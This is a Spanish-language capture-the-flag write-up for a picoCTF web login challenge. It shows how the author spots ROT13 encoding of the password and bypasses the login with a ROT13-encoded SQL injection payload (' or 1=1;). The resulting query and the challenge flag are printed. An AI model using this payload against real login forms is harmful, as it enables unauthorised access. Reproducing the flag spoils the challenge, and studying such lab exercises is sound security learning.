# Objetivo

Hay un sitio web seguro en https://jupiter.challenges.picoctf.org/problem/40742/ (enlace) o http://jupiter.challenges.picoctf.org:40742. ¡Intenta ver si puedes iniciar sesión como administrador!
1. Parece que la contraseña está cifrada.

## Solución

```
Al inspeccinas el codigo fuente, en el boton para hacer el login, activamos el debug para ver el contenido de la consulta. Muestra lo siguiente:
password: holamundo
SQL query: SELECT * FROM admin where password = 'ubynzhaqb'

# Login failed.

Observamos que nuestro password ingresado, nos lo convierte en un texto diferente, entonces debemos hacer uso del cyberchef para encontrar el tipo de cifrado que hace la pagina para tener mayor seguridad.
Observaremos que este texto que cirfa, esta en ROT13. Solo tenemos que aplicar ingenieria inversa para nosotros rotar lo que vaamos a ingrear y a la hora de que la pagina le aplica el ROT13, se descifre como lo que en realidad queremos ingresar.

Hacemos este procedimiento y observamos que funciono a la perfeccion:
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
## Notas adicionales

Usamos las siguientes instrucciones:
password: ' be 1=1; -- Aqui ingresamos el texto con ROT13 para que la pagina lo traduzca.
SQL query: SELECT * FROM admin where password = '' or 1=1;'

## Referencias

https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=dWJ5bnpoYXFi